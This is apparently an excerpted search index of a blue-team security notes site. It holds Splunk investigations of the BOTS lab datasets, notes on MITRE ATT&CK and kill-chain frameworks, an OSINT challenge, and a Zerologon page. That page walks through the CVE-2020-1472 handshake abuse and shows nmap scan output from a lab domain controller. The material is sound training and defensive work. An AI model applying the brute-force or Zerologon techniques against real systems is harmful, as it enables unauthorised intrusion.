    "c": "Exploitation phase  So far: We found two IP addresses from the reconnaissance phase with sending requests to our server. One of the IPs 40.80.148.42 was seen attempting to scan the server with IP 192.168.250.70 . The attacker was using the web scanner Acunetix for the scanning attempt. The attacker needs to exploit the vulnerability to gain access to the system/server. Look at the potential exploitation attempt from the attacker against the web server and see if the attacker got successful in exploiting or not. Count  To see the number of counts by each source IP against the webserver, use search query: index=botsv1 imreallynotbatman.com sourcetype=stream* | stats count(src_ip) as Requests by src_ip | sort - Requests No results. To show requests sent to the web server 192.168.250.70 : index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" 20,275 events. To see what kind of traffic is coming through the POST requests, narrow down on the field http_method=POST : index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" http_method=POST 14,238 events. To narrow down the search even further, to see the requests sent to the login portal: index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" http_method=POST uri=\"/joomla/administrator/index.php\" 425 events. Dig deep into the values contained within the form_data field: index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" http_method=POST uri=\"/joomla/administrator/index.php\" | table _time uri src_ip dest_ip form_data Two interesting fields: username includes the single username admin in all the events passwd contains multiple passwords Questions  What IP address is likely attempting a brute force password attack against imreallynotbatman.com ? , What was the URI which got multiple brute force attempts? , and Against which username was the brute force attempt made? 23.22.63.114 resp. /joomla/administrator/index.php , against username admin This indicates the attacker from the IP 23.22.63.114 was trying to bruteforce the admin password. The time elapsed between the multiple events suggests that the attacker was using an automated tool. Extracting username and passwd fields using Regex  To display only the logs that contain the username and passwd values in the form_data field by adding form_data=*username*passwd* in the search query: index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" http_method=POST uri=\"/joomla/administrator/index.php\" form_data=*username*passwd* | table _time uri src_ip dest_ip form_data To extract all the password values found against the field passwd in the logs, Splunk has a function called rex . Use rex field=form_data \"passwd=(?<creds>\\w+)\" to extract the passwd values only. This will pick the form_data field and extract all the values found with the field creds : index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" http_method=POST form_data=*username*passwd* | rex field=form_data \"passwd=(?<creds>\\w+)\" | table src_ip creds The first value shows the attacker used a python script to automate the brute force attack against our server. But one request came from a Mozilla browser. WHY? Add http_user_agent field in the search head: index=botsv1 sourcetype=stream:http dest_ip=\"192.168.250.70\" http_method=POST form_data=*username*passwd* | rex field=form_data \"passwd=(?<creds>\\w+)\" |table _time src_ip uri http_user_agent creds Questions  What was the correct password for admin access to the content management system running imreallynotbatman.com ? , How many unique passwords were attempted in the brute force attempt? , and After finding the correct password, which IP did the attacker use to log in to the admin panel? batman , 413-1=412 , and 40.80.148.42",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "9e2e5b48d4fa36285c777a50c07f490d",
    "u": "https://siem.tymyrddin.dev/docs/notes/mitre",
    "t": "MITRE ATT&CK framework ",
    "c": "MITRE ATT&CK framework  The MITRE ATT&CK™ framework is a constantly evolving hub of attacker tips, tactics, and techniques used by IT and security teams to pinpoint their organisation’s risks and prioritize and focus their protection efforts. ATT&CK is an acronym that stands for Adversarial Tactics, Techniques, and Common Knowledge. This framework is a combination of intrusion techniques grouped into 12 different tactics. Initial access  These are techniques used by various entry vectors to gain an initial foothold within a network, for instance, the T1192 Spear Phishing Link. Execution  These are techniques that allow the running of attacker-controlled code on a local system or a remote one. An example is the T1086 PowerShell Persistence  These are techniques attackers use to maintain persistence when accessing a system. An example is the T1037 Logon Script. Privilege escalation  These are techniques that allow attackers to gain high-level privileges on a system or network. An example is the T1055 Process Injection. Defence evasion  These are techniques attackers use in avoiding detection. An example is the T1073 DLL Side-Loading. Credential access  These are techniques attackers use for stealing credentials like account names, passwords. An example is the T1208 Kerberoasting Discovery  These are the techniques attackers use to gain knowledge about their clients’ systems and networks. An example is the T1040 Network Sniffing Lateral movement  These are techniques that attackers use in gaining remote access to the systems and networks of their already compromised host. Usually, attackers move through multiple computers, starting with the weakest link till they reach their aim. An example is a T1097 Pass the Ticket Collection  These are the techniques that aid in gathering information relevant to the attacker’s aim. An example is the T1506 input capture. These are techniques attackers employ to communicate with the systems they have under their control, often making things look like regular HTTP traffic. An example is the T1172 Domain Fronting. Exfiltration  These are techniques that attackers use to steal data from the network of their victims. An example is the T1002 Data Compressed. Impact  These are techniques used by attackers to disturb or compromise networks’ integrity by manipulating operational and business processes. The impact is the last phase, and it is what happens when the attacker has reached their goal. Resources  MITRE ATT&CK® Fast Flux 101: How Cybercriminals Improve the Resilience of Their Infrastructure to Evade Detection and Law Enforcement Takedowns Purple Team Exercise Framework (PTEF)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "071321d135bc823faba631c6e65db76b",
    "u": "https://siem.tymyrddin.dev/docs/notes/siem",
    "t": "SIEM stack ",
    "c": "SIEM stack  Security information and event management (SIEM) is an approach to security management that combines security information management (SIM) and security event management (SEM) functions into one security management system. It is a software solution that aggregates and analyses activity from many different resources across an IT infrastructure. SIEM collects security data from network devices, servers, domain controllers, etc., and search queries can be done to look for specific answers from ingested logs. Tools and architecture  Many SIEM tools exist, Kibana, Splunk, Elastic SIEM, Datadog, QRadar, UnderDefense, etc., and architecture varies. In general, if a tool has a SIEM engine, it contains three components: A data collector forwarding selected audit logs from a host (agent based or host based log streaming into index and aggregation point) An aggregation point for parsing, correlation, and data normalisation. A search node used for visualisation, queries, reports, and alerts (actual analysis takes place on a search node) SIEM stack requirements  Log ingestion  Collect logs originating on endpoint devices, network devices, or 3rd party services Normalise log fields to universal names for faster searching and better visualisations Ensure caching of logs if backend storage is busy or offline Ability to ingest mobile logs Log analysis  Analyse logs from endpoints/services Determine the severity of logs ingested via log analysis Ability to discard noisy alerts to limit overflow of unnecessary data Backend storage  Store received logs for a period of time Fast searching and viewing of data Ability to provide access control to stored logs Visualisation  Ability to view logs via widgets Fast searching and viewing of data Support the ability to read from multiple log storages (Elastic, MySQL, …) Intelligence enrichment  Enrich received log with threat intelligence gathered from various providers Ability to parse and store selected responses so that only crucial data is stored Automated, so that SOC analysts are not having to manually attempt to enrich logs Case management  Platform to view and react to high severity events Allow collaboration with multiple SOC analysts Allow responsive actions so that analysts can trigger events on their endpoints (escalation procedure) Automate  SOAR platform Ability to automate workflows in response to critical alerts, failed health checks, or ticket analysis Fully customisable, and fast Investigation  Incident response Quarantine a device Ability to remotely collect endpoint forensics Health monitoring  Monitor resources consumed on endpoints Monitor services/process whose stoppage would cause operational impact Ability to alert in real-time when health check thresholds are met Testlab  Gradually building up to something useful for the IPA project: Wazuh  Wazuh single-node deployment with docker , bare-bones single-node deployment: One Wazuh manager, indexer, and dashboard node. Wazuh multi-node deployment with docker , two Wazuh manager nodes (one master and one worker), three Wazuh indexer nodes, and a Wazuh dashboard node. Testlab  SIEM stack All tools in these stacks are open source and free.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "da2169fa5a8cc747f35592bda5d0958d",
    "u": "https://siem.tymyrddin.dev/docs/incident/scenario",
    "t": "I am really not batman ",
    "c": "I am really not batman  A Big corporate organisation Wayne Enterprises has recently faced a cyber-attack where the attackers broke into their network, found their way to their web server, and have successfully defaced their website http://www.imreallynotbatman.com . Their website is now showing the trademark of the attackers with the message YOUR SITE HAS BEEN DEFACED . They have requested “us” to join them as a Security Analyst and help them investigate this cyberattack and find the root cause and all the attackers’ activities within their network. The good thing is, that they have Splunk already in place, so we have got all the event logs related to the attacker’s activities captured. We need to explore the records and find how the attack got into their network and what actions they performed. Log sources available to us: wineventlog (Windows Event logs) winRegistry (logs related to registry creation/modification/deletion etc.) XmlWinEventLog (sysmon event logs) fortigate_utm (Fortinet Firewall logs) iis (IIS web server logs) Nessus:scan (results from the Nessus vulnerability scanner) Suricata (details of the alerts from the Suricata IDS) stream:http (network flow related to http traffic) stream: DNS (network flow related to DNS traffic) stream:icmp (network flow related to icmp traffic) Cyber Kill Chain  A cyberattack in which the attacker defaced an organisation’s website. This organisation has Splunk as a SIEM solution setup. Our task as a Security Analysis would be to investigate this cyberattack and map the attacker’s activities into all 7 of the Cyber Kill Chain Phases. We do not need to follow the sequence of the cyber kill chain during the investigation. One finding in one phase will lead to another finding that may have mapped into some other phase. This Investigation comes under the Detection and Analysis phase.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "0a73caa94620bfffc28094b34de54e16",
    "u": "https://siem.tymyrddin.dev/docs/notes/ukc",
    "t": "Unified kill chain ",
    "c": "Unified kill chain  A more comprehensive approach combines elements from both the Cyber kill chain and the MITRE ATT&CK framework , dividing an attack into 18 stages: Everything from reconnaissance to data exfiltration and understanding an attacker’s motive. By using these two frameworks and comparing IOCs simultaneously against several feeds of reliable threat intel, it helps to know whether a threat needs attention or not. Both defenders and red teams can use a unified kill chain attack model to help develop and improve defensive controls. Resources  The Unified Kill Chain Purple Team Exercise Framework (PTEF)",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "db7b65edd33ecabd701cf34a03c40d83",
    "u": "https://siem.tymyrddin.dev/docs/thm/caddywiper",
    "t": "CaddyWiper and APT37 ",
    "c": "CaddyWiper and APT37  As a SOC analyst, you have been tasked with investigations on malware and APT groups rampaging through the world. Your assignment is to look into the CaddyWiper malware and APT37 group. Gather information from OpenCTI to answer the following questions. What is the earliest date recorded related to CaddyWiper? Format: YYYY/MM/DD 2022/03/15 (Search for and read the report online) Which Attack technique is used by the malware for execution? Native API How many malware relations are linked to this Attack technique? 113 Which 3 tools were used by the Attack Technique in 2016? (Ans: Tool1, Tool2, Tool3) Bloodhound, Empire, ShimRatReporter What country is APT37 associated with? North Korea Which Attack techniques are used by the group for initial access? (Ans: Technique1, Technique2) T1189,T1566 And that’s it.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "cb4c503725380f0d96e4e9f680f4c8b3",
    "u": "https://siem.tymyrddin.dev/docs/bots/100",
    "t": "Web activity investigation ",
    "c": "Web activity investigation  The questions below are from the BOTSv2 dataset, questions 100-104. Some additional questions were added. The focus is on Amber Turing and her communication with a competitor. Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited? index=\"botsv2\" 10.0.2.101 sourcetype=\"stream:HTTP\" \"beer\" | dedup site | table site Answer: www.berkbeer.com Amber found the executive contact information and emailed him. What image file displayed the executive’s contact information? Answer example: /path/image.ext index=\"botsv2\" 10.0.2.101 sourcetype=\"stream:HTTP\" \"www.berkbeer.com\" | table uri_path Answer: /images/ceoberk.png What is the CEO’s name? Provide the first and last name. index=\"botsv2\" sourcetype=\"stream:smtp\" \"*berkbeer.com\" One of the results is an email sent from mberk@berkbeer.com . Expand the content_body field: Answer: Martin Berk What is the CEO’s email address? Answer: mberk@berkbeer.com After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee’s email address? Answer: hbernhard@berkbeer.com What is the name of the file attachment that Amber sent to a contact at the competitor? index=\"botsv2\" sourcetype=\"stream:smtp\" \"amber\" Answer: Saccharomyces_cerevisiae_patent.docx What is Amber’s personal email address? In the email reply to hbernhard@berkbeer.com , under content_body, it is base64 encoded in the field content_transfer_encoding . Decode the content body. Answer: ambersthebest@yeastiebeastie.com",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "1b403fbbe058e9ba118f369eaae68283",
    "u": "https://siem.tymyrddin.dev/docs/incident/c2",
    "t": "Command and control phase ",
    "c": "Command and control phase  The attacker uploaded the file to the server to deface it. While doing so, the attacker used a Dynamic DNS to resolve a malicious IP. The objective in this phase would be to find the IP that the attacker decided the DNS. To investigate the communication to and from the adversary’s IP addresses, examine the network-centric log sources. First pick fortigate_utm to review the firewall logs and then move on to the other log sources. index=botsv1 sourcetype=fortigate_utm\"poisonivy-is-coming-for-you-batman.jpeg\" Look at the fields on the left panel and the field url contains the FQDN (Fully Qualified Domain Name). Verify the answer by looking at another log source.stream:http . index=botsv1 sourcetype=stream:http dest_ip=23.22.63.114 \"poisonivy-is-coming-for-you-batman.jpeg\" src_ip=192.168.250.70 Confirm the domain by looking at the last log source stream:dns to see what DNS queries were sent from the webserver during the infection period. Questions  This attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack? prankglassinebracket.jumpingcrab.com",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "58223f5b1b63d836481a31b7f767b217",
    "u": "https://siem.tymyrddin.dev/docs/notes/ckc",
    "t": "Cyber kill chain ",
    "c": "Cyber kill chain  The Cyber Kill Chain framework is designed for identification and prevention of the network intrusions. Lockheed Martin established the Cyber Kill Chain® framework for the cybersecurity industry in 2011 based on the military concept. The framework defines the steps used by adversaries or malicious actors in cyberspace. The cyber kill chain is not outdated. Instead, it has security gaps. And that is akin to “not a bug, a feature”. These security gaps exist because the model has not been modified since its creation about a decade ago. The model’s design works well to protect against malware prevention and detection, which it was designed for. The model’s problem stems from the fact that it uses an ancient approach to network security, focusing only on malware prevention and perimeter security. The different stages of the protocol controls does nothing to detect an attacks’ progression. The model cannot identify insider threats or intrusions with remote access, because these threats do not involve malware or payloads. Reconnaissance  A malicious attacker who names himself “Megatron” decides to conduct a very sophisticated attack that he has been planning out for years; he has been studying and researching different tools and techniques that could help him get to the last phase of the Cyber Kill Chain. But first, he needs to start from the Reconnaissance phase. During reconnaissance, attackers gather as much info they can access about their targets. The attackers can use a wide range of tools. In most cases, they take advantage of the public information available about their targets and continue from there. Examples of this stage of attack include: Attackers can use automated scanners to find weak points and vulnerabilities that allow penetration. Attackers also investigate the victim’s security systems, like intrusion detection systems, authentication mechanisms, and firewalls. Attackers would also use social media websites such as LinkedIn, Facebook, Twitter, and Instagram to collect information on a specific victim he would want to attack or the company. The information found on social media can be beneficial for an attacker to conduct a phishing attack. Weaponisation  At this stage of the attack, the attackers act on the information they have collected about their target and find weaknesses they can exploit. Using the exploit, the attackers will create a malicious payload using encrypted channels such as HTTPS port 443 over SSL that they will send to their victim. Everything is still on the attacker’s side, and the target has not been exploited or actively attacked yet. “Megatron” chooses to buy an already written payload from someone else in the DarkWeb, so that he can spend more time on the other phases. In the Weaponisation phase, the attacker would: Create an infected Microsoft Office document containing a malicious macro or VBA (Visual Basic for Applications) scripts. If you want to learn about macro and VBA, please refer to the article “Intro to Macros and VBA For Script Kiddies” by TrustedSec. Attackers can create a malicious payload or a very sophisticated worm, implant it on the USB drives, and then distribute them in public. An example of the virus. Attackers would choose Command and Control (C2) techniques for executing the commands on the victim’s machine or deliver more payloads. You can read more about the C2 techniques on MITRE ATT&CK. Attackers would select a backdoor implant (the way to access the computer system, which includes bypassing the security mechanisms). Delivery  At the intrusion stage, the attacker is trying to gain entry into the victim’s security perimeter. To do this, attackers usually inject various forms of malware into the systems of the victim to gain control. The malicious content can be delivered to the target either by social engineering email, social media or compromised systems or accounts or a security breach like an open port or an insider accomplice. “Megatron” decides to choose the method for transmitting the payload or the malware. He has plenty of options to choose from: Phishing email Distributing infected USB drives in public places like coffee shops, parking lots, or on the street. Watering hole attack Supply chain compromise Spear phishing attachments External/remote services Exploitation  During the exploitation stage, attackers will seek other victim vulnerabilities that they did not know before entering. For instance, an attacker might not have privileged access to an organisation’s database from outside; however, they might spot vulnerabilities in the database that allows them to gain entry after an intrusion. Example attacks in the exploitation stage include: PowerShell, .Net, C# scripts Local job scheduling Dynamic data exchange “Megatron” got a bit creative - he created two phishing emails, one that contains a phishing link to a fake Office 365 login page and another one containing a macro attachment that would execute ransomware when the victim opens it. “Megatron” successfully delivered his exploits and got two victims to click on the malicious link and open the malicious file. Installation  At the privilege escalation stage, the attacker attempts to gain the additional privilege to more accounts and systems. The attacker might decide to use brute force, or on the alternative, he might seek out unprotected repositories containing security credentials or monitor networks without encryption to track the credentials. He might as well consider changing permissions on previously existing compromised accounts. He would want to reaccess the system if he loses the connection to it or if he got detected and got the initial access removed, or if the system is later patched. He will no longer have access to it. That is when the attacker needs to install a persistent backdoor. A persistent backdoor will let the attacker access the system he compromised in the past. When he has the persistence and credentials he needs, the attacker then proceeds to other systems to find the most valuable assets of his target. Attackers typically move from one system to the other, seeking access to privileged accounts, sensitive data. This is usually a coordinated attack and usually affects several user accounts and IT systems. Example attacks in the privilege escalation and lateral movement stage: Windows remote management Pseudo attack SSH hijacking Shared webroot Process injection Path interception Internal spear phishing Access token manipulation Persistence can be achieved through: Installing a web shell on the webserver. A web shell is a malicious script written in web development programming languages such as ASP, PHP, or JSP used by an attacker to maintain access to the compromised system. Because of the web shell simplicity and file formatting (.php, .asp, .aspx, .jsp, etc.) can be difficult to detect and might be classified as benign. You may check out this great article released by Microsoft on various web shell attacks. Installing a backdoor on the victim’s machine. For example, the attacker can use Meterpreter to install a backdoor on the victim’s machine. Meterpreter is a Metasploit Framework payload that gives an interactive shell from which an attacker can interact with the victim’s machine remotely and execute the malicious code. Creating or modifying Windows services. This technique is known as T1543.003 on MITRE ATT&CK (MITRE ATT&CK® is a knowledge base of adversary tactics and techniques based on real-world scenarios). An attacker can create or modify the Windows services to execute the malicious scripts or payloads regularly as a part of the persistence. An attacker can use the tools like sc.exe (sc.exe lets you Create, Start, Stop, Query, or Delete any Windows Service) and Reg to modify service configurations. The attacker can also masquerade the malicious payload by using a service name that is known to be related to the Operating System or legitimate software. Adding the...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "3629966e2291dc3a9fae8049324e7889",
    "u": "https://siem.tymyrddin.dev/docs/notes/til",
    "t": "Threat intelligence lifecycle ",
    "c": "Threat intelligence lifecycle  Credits: Introduction to Cyber Threat Intelligence (CTI) . Threat intel is obtained from a data-churning process that transforms raw data into contextualised and action-oriented insights geared towards triaging security incidents. The transformational process can be expressed in a six-phase cycle: Direction  Every threat intel program requires to have objectives and goals defined, involving identifying the parameters: Information assets and business processes that require defending. Potential impact to be experienced on losing the assets or through process interruptions. Sources of data and intel to be used towards protection. Tools and resources that are required to defend the assets. This phase also allows security analysts to pose questions related to investigating incidents. Collection  Once objectives have been defined, security analysts will gather the required data to address them. Analysts will do this by using commercial, private and open-source resources available. Due to the volume of data analysts usually face, it is recommended to automate this phase to provide time for triaging incidents. Processing  Raw logs, vulnerability information, malware and network traffic usually come in different formats and may be disconnected when used to investigate an incident. This phase ensures that the data is extracted, sorted, organised, correlated with appropriate tags and presented visually in a usable and understandable format to the analysts. SIEMs are valuable tools for achieving this and allow quick parsing of data. Analysis  Once the information aggregation is complete, security analysts must derive insights. Decisions to be made may involve: Investigating a potential threat through uncovering indicators and attack patterns. Defining an action plan to avert an attack and defend the infrastructure. Strengthening security controls or justifying investment for additional resources. Dissemination  Different organisational stakeholders will consume the intelligence in varying languages and formats. For example, C-suite members will require a concise report covering trends in adversary activities, financial implications and strategic recommendations. At the same time, analysts will more likely inform the technical team about the threat IOCs, adversary TTPs and tactical action plans. Feedback  The final phase covers the most crucial part, as analysts rely on the responses provided by stakeholders to improve the threat intelligence process and implementation of security controls. Feedback should be regular interaction between teams to keep the lifecycle working.",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "efd922283e925652cea7195664cc611c",
    "u": "https://siem.tymyrddin.dev/docs/thm/zerologon",
    "t": "Zerologon ",
    "c": "Zerologon  On September 14, Secura released a whitepaper for CVE-2020-1472 , that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon. Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short – the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential , which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero. In this room , the ZeroLogon vulnerability is approached from a “Proof of Concept” (PoC) emphasis, providing a breakdown of the vulnerable method within this issue. TryHackMe does not condone illegal actions taken on the part of an individual (or group). Analysing the MS-NRPC logon process  Simplified Netlogon authentication handshake Step 1. The client creates a NetrServerReqChallenge and sends it off with values: The DC The Target Device (Also the DC, in our case) A Nonce (In this case 16 Bytes of Zero). Step 2. The server receives the NetrServerReqChallenge , the server will then generate its own Nonce (This is called the Server Challenge ), and will send the Server Challenge back. Step 3. The client will compute its NetLogon Credentials with the Server Challenge provided. It uses the NetrServerAuthenticate3 method which requires the following parameters: A Custom Binding Handle (Impacket handles this for us, it’s negotiated prior) An Account Name (The Domain Controller’s machine account name. ex: DC01$ ) A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel ) The Computer Name (The Domain Controller ex: DC01 ) The Client Credential String (this will be 8 hextets of \\x00 (16 Bytes of Zero)) Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura) Step 4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it’s known, good values. If the results are good, the server will send the required info back to the client. At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, where we are hoping for the Server to a have the same computations as the client. This is where the 1-in-256 chance comes in. The Zerologon attack, which effectively boils down to filling particular message parameters with zeroes and retrying the handshake a few times in order to set an empty computer password on the DC. Step 5. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key . The session key will be used to encrypt communications between the client and the server, which means authentication is successful. Instantly Become Domain Admin  Scan target: $ sudo nmap -sC -sV <target IP> -vv Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-30 20:41 GMT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 20:41 Completed NSE at 20:41, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 20:41 Completed NSE at 20:41, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 20:41 Completed NSE at 20:41, 0.00s elapsed Initiating Ping Scan at 20:41 Scanning 10.10.157.233 [4 ports] Completed Ping Scan at 20:41, 0.08s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 20:41 Completed Parallel DNS resolution of 1 host. at 20:41, 0.01s elapsed Initiating SYN Stealth Scan at 20:41 Scanning 10.10.157.233 [1000 ports] Discovered open port 3389/tcp on 10.10.157.233 Discovered open port 139/tcp on 10.10.157.233 Discovered open port 135/tcp on 10.10.157.233 Discovered open port 80/tcp on 10.10.157.233 Discovered open port 445/tcp on 10.10.157.233 Discovered open port 53/tcp on 10.10.157.233 Discovered open port 636/tcp on 10.10.157.233 Discovered open port 389/tcp on 10.10.157.233 Discovered open port 3268/tcp on 10.10.157.233 Discovered open port 464/tcp on 10.10.157.233 Discovered open port 3269/tcp on 10.10.157.233 Discovered open port 88/tcp on 10.10.157.233 Discovered open port 593/tcp on 10.10.157.233 Completed SYN Stealth Scan at 20:41, 0.87s elapsed (1000 total ports) Initiating Service scan at 20:41 Scanning 13 services on 10.10.157.233 Completed Service scan at 20:43, 142.72s elapsed (13 services on 1 host) NSE: Script scanning 10.10.157.233. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 20:43 Completed NSE at 20:44, 15.02s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 20:44 Completed NSE at 20:44, 3.42s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 20:44 Completed NSE at 20:44, 0.00s elapsed Nmap scan report for 10.10.157.233 Host is up, received echo-reply ttl 127 (0.047s latency). Scanned at 2022-10-30 20:41:23 GMT for 162s Not shown: 987 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 53/tcp open domain? syn-ack ttl 127 80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn't have a title (text/html). 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-10-30 20:41:30Z) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hololive.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 3389/tcp open ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: HOLOLIVE | NetBIOS_Domain_Name: HOLOLIVE | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: hololive.local | DNS_Computer_Name: DC01.hololive.local | Product_Version: 10.0.17763 |_ System_Time: 2022-10-30T20:43:47+00:00 |_ssl-date: 2022-10-30T20:44:05+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.hololive.local | Issuer: commonName=DC01.hololive.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-10-29T20:30:54 | Not valid after: 2023-04-30T20:30:54 | MD5: 62030478ed5f961d8de78c4320b6ecb4 | SHA-1: 61f06fd27c274c25bcfd18bf9071deedde71480e | -----BEGIN CERTIFICATE----- | MIIC6jCCAdKgAwIBAgIQbR35+QuaCqRI7lDweNf1wjANBgkqhkiG9w0BAQsFADAe | MRwwGgYDVQQDExNEQzAxLmhvbG9saXZlLmxvY2FsMB4XDTIyMTAyOTIwMzA1NFoX | DTIzMDQzMDIwMzA1NFowHjEcMBoGA1UEAxMTREMwMS5ob2xvbGl2ZS5sb2NhbDCC | ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJVruwf7lpE3tXrLTFWnwQZ9 | cp541+ob7PH+LFYji9euZrm+RfIBvf/f42e28RJEzk79PKDo0yu/IERVVyMn0xnz | PRAzHfdKB3J3Ktwb3GBMWthdH1jQ5fT+noi8OTgNozc3Sfyzuo8qL4VCL1vKUr9v | MyYwzEOEjw+FAnY6KHNU/E8ha3WwYYmt7Gu7mmv1Jv9BF0FbklXZQfuBy92B/crH | Ac0T54Um+TEUsfmLK6g6SC/YQnBZpgG3QBNbX1wXaq7j/SkuttWMSJJxITNWpOxv | RbdDjGIHPWhiWK7VqqRWUdhUHdKd2dRVZb9IUWunk0usomaBTt7hxulNstVOWPEC |...",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "a8274e33d23a23555ece2e18a289de1c",
    "u": "https://siem.tymyrddin.dev/docs/cd/intel101",
    "t": "Intel101 ",
    "c": "Intel101  Scenario  This CyberDefenders challenge is an open-source intelligence (OSINT) exercise to practice mining and analyzing public data to produce meaningful intel when investigating external threats as a security blue team analyst. Tools used  whois DuckDuckGo Wayback Machine Google Lens Questions  Q1 Who is the Registrar for jameskainth.com? sansforensics@siftworkstation: ~/Desktop/cases/c22-Intel101/Intel101 $ whois jameskainth.com | grep Registrar: Registrar: NameCheap, Inc. Registrar: NAMECHEAP INC Q2 You get a phone call from this number: 855-707-7328, they were previously known by another name? (No spaces between words) DuckDuckGo 855-707-7328 leads to Spectrum , leads to Wikipedia Time Warner Cable . Q3 What is the Zoom meeting id of the British Prime Ministers Cabinet Meeting? The UK Cabinet is meeting on Zoom… here’s the meeting ID Q4 What Percentage of full-time degree-seeking freshmen from the fall of 2018 re-enrolled to Champlain in the fall of 2019? It’s getting harder: Wayback machine for http://members.ucan-network.org/champlain March snapshot Q5 In 1998 specifically on February 12th, Champlain was planning on adding an exciting new building to its campus. Back then, it was called “The Information Commons”. Can you find a picture of what the inside would look like? Upload the sha256 hash here. Wayback machine for Champlain College Information Commons New Technology/Library Building 1998 February snapshot Download and calculate hash: nina@tardis:~/Pictures$ sha256sum inside1.jpg f4952b314eb15acf0eec79c954f83881c17d50d2b5922ee37e8fc5e5cd1aeac2 inside1.jpg Q6 One of Champlain College’s Cyber Security Faculty got a bachelor’s degree in arts from this Ohioan university. Who was the other faculty member who studied there? (FirstName LastName - two words) Todd Q7 In 2019 UVM’s Ichthyology Class Had to Name their fish for class. Can you find out what the last person on the public roster named their fish? Use Wayback urls for https://www.uvm.edu/rsenr to find Student fish names . Q8 Can You Figure Out Which State This Picture Has Been Taken From? See attached photo Use Google Lens .",
    "cat": "blue_soc",
    "type": "html"
  },
  {
    "objectID": "2799b28d7becd4bc951ec599a345733c",
    "u": "https://siem.tymyrddin.dev/docs/bots/200",
    "t": "Detecting SQL and XSS web application attacks ",
